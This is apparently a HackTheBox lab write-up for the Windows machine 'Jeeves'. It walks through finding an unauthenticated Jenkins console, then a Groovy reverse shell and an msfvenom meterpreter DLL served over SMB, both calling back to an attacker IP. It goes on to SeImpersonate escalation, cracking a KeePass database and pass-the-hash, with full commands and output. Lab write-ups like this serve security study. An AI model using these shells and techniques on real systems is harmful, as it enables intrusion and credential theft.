---
title: 'HackTheBox | Jeeves'
published: 2026-09-28
draft: false
description: 'HackTheBox Machine `Jeeves` writeup.'
tags: ['HackTheBox', 'windows', 'SeImpersonatePrivilege']
---

Jeeves was a medium-rated, non-domain joined windows machine, released in 2017, but by today's standards, it is a very easy machine that most of it can be completed through metasploit. It starts from a hidden `Jenkins` instance that requires no authentication and can run system commands, from the `Groovy script console`. I'll use that to get a reverse shell back, as `kohsuke`, the only user on the machine. Next, for privilege escalation there are 2 paths, one involving exploiting the `SeImpersonatePrivilege` to get to `NT\Authority\System` and the other involving cracking a KeePass database that leaks some credentials and the `administrator`'s hash.

---

## Port Scan

```
PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-09-27T21:27:29
|_  start_date: 2026-09-27T21:12:55
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 4h59m02s, deviation: 0s, median: 4h59m01s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 58009/tcp): CLEAN (Timeout)
|   Check 2 (port 38696/tcp): CLEAN (Timeout)
|   Check 3 (port 39602/udp): CLEAN (Timeout)
|   Check 4 (port 35344/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

`Nmap` shows 4 ports open. These include:

- 80 / 50000 - `http`
- 135 / 445 - `SMB`

HTTP port 80 is running `Microsoft IIS 10.0` web server and port 5000 is running an instance of `Jetty 9.4`

---

## Recon

### SMB - Port 445

- `NULL` authentication is not allowed. I'll need credentials to connect

### HTTP Port 80

The website is titled **"Ask Jeeves"**. It looks like a search engine. Any search queries returns an error page `error.html`

#### Directory Bruteforce

A directory brute-force with the `raft` wordlists and `.aspx` extension found nothing.

### HTTP Port 50000

The default page returns a 404 error. It's an instance of `Jetty`, a web server written in Java.

### Directory Bruteforce

- My initial attempt to bruteforce using the `raft-medium-directories` wordlist returned nothing.
- Next, I tried the `DirBuster-2.3-medium` wordlist and got a hit.

```shell
$cat dirbrute/http-50000.ffuf | jq .results[].input.FUZZ
"askjeeves"
```

### HTTP Port 50000 `/askjeeves/`

- This page is an instance of jenkins (version 2.87), that requires no authentication to interact with it.
- The `Groovy Script Console` that can be accessed at `project_root/script` i.e., `/askjeeves/script` can be used to run system commands. I can test it by running a simple `whoami` command using the following script:

```groovy
def cmd = 'whoami'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

- ## It returns `jeeves\kohsuke`

## Shell as `Kohsuke`

- I'll use a Groovy script reverse shell from `revshells.com` and modify it to execute `cmd.exe`

```groovy
String host="10.10.16.51";int port=9001;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

- On executing, I immediately get a shell as `jeeves\kohsuke`
- I can now read the user flag, located at `C:\Users\kohsuke\Desktop\user.txt`

```powershell
PS C:\Users\kohsuke\Desktop> ls


    Directory: C:\Users\kohsuke\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/3/2017  11:22 PM             32 user.txt
```

### Upgrading to a proper shell

- Before moving further, I'll upgrade my `cmd` shell to a `meterpreter` shell.
- First, I'll need a _malicious_ `.dll` file that I can generate with the following command:

```shell
$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.16.51 LPORT=4444 -f dll -o meterpreter.dll
```

- Next, I'll start a `SMB` server on my attack box

```shell
$ impacket-smbserver -smb2support MyShare ./
```

- Finally, I'll run this command in my current shell, and after 10-20 seconds, I get a connection back.

```powershell
PS C:\Users\kohsuke\Desktop> rundll32.exe \\10.10.16.51\MyShare\meterpreter.dll,0
```

```shell
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run                             [*] Started reverse TCP handler on 10.10.16.51:4444                              [*] Meterpreter session 1 opened (10.10.16.51:4444 -> 10.129.228.112:49684) at 2026-09-27 13:22:57 -0400
(Meterpreter 1)(C:\Users\kohsuke\Desktop) >
```

---

## Shell as `NT AUTHORITY\SYSTEM`

- I'll start by checking the privileges of my current user.
- He has the `SeImpersonate` privilege that can be used to escalate to `SYSTEM` privileges.
- I can use any exploit like `PrintSpoofer` or `JuicyPotato`, but I used `metasploit` to exploit this.
- The `getsystem` command in `Metasploit`/`Meterpreter` has 6 techniques available, the 5th one can be used to exploit this privilege and get a system shell.

```shell
(Meterpreter 1)(C:\Users\kohsuke\Desktop) > getsystem -h
Usage: getsystem [options]                                                       Attempt to elevate your privilege to that of local system.                       OPTIONS:                                                                             -h   Help Banner.                                                                -t   The technique to use. (Default to '0').                                                 0 : All techniques available                                                     1 : Named Pipe Impersonation (In Memory/Admin)                                   2 : Named Pipe Impersonation (Dropper/Admin)                                     3 : Token Duplication (In Memory/Admin)                                          4 : Named Pipe Impersonation (RPCSS variant)                                     5 : Named Pipe Impersonation (PrintSpooler variant)                              6 : Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
```

```shell
(Meterpreter 1)(C:\Users\kohsuke\Desktop) > getsystem -t 5                       ...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
(Meterpreter 1)(C:\Users\kohsuke\Desktop) > shell                                Process 1220 created.                                                            Channel 1 created.                                                               Microsoft Windows [Version 10.0.10586]                                           (c) 2015 Microsoft Corporation. All rights reserved.
C:\Users\kohsuke\Desktop>whoami                                                  whoami                                                                           nt authority\system
```

## Shell as `Administrator`

Looking around in `Kohsuke`'s home directory, there's a `CEH.kdbx` file in his `Documents` folder. I can download it with a single command using `meterpreter`

```shell
(Meterpreter 1)(C:\Users\kohsuke\Documents) > ls
Listing: C:\Users\kohsuke\Documents
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  2846  fil   2017-09-18 13:43:17 -0400  CEH.kdbx
040777/rwxrwxrwx  0     dir   2017-11-03 22:50:40 -0400  My Music
040777/rwxrwxrwx  0     dir   2017-11-03 22:50:40 -0400  My Pictures
040777/rwxrwxrwx  0     dir   2017-11-03 22:50:40 -0400  My Videos
100666/rw-rw-rw-  402   fil   2017-11-03 23:15:51 -0400  desktop.ini

(Meterpreter 1)(C:\Users\kohsuke\Documents) > download CEH.kdbx
```

- It's a `KeePass` database file. I can open it using `keepass2` program on `Linux`, but it requires a master password to unlock

### Cracking Master Password

- I can use `keepass2john` to extract the hash of the database.

```shell
$ keepass2john CEH.kdbx | tee keepass.hash
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c9
7beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

- Next, I can crack this hash using `John`. The master password is **moonshine1**

```shell
$john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:00:20 DONE (2026-09-27 13:33) 0.04885g/s 2685p/s 2685c/s 2685C/s nick18..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Opening the Password Manager

- I will use the `keepass2` GUI program to open the `CEH.kdbx` file, input the cracked master password, and read all the stored passwords.
  ![[Pasted image 20260928085515.png]]
- I'll try these entries with `netexec smb` to log in as `administrator`, but none of them work.
- The last entry, `Backup stuff`, looks like a windows hash of format `LM:NT`
- I'll use this hash with `PassTheHash` technique to get an `administrator` shell

---

## Reading `root.txt`

- There's no `root.txt` in the administrator's desktop but a note `hm.txt` that tells to dig deeper.
- I'll check for **alternate data streams** using the `dir /R` command and notice a stream called `root.txt`
- I can read it by piping it into `more`:

```powershell
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,657,357,824 bytes free

C:\Users\Administrator\Desktop>type hm.txt:root.txt
type hm.txt:root.txt
The filename, directory name, or volume label syntax is incorrect.

C:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```
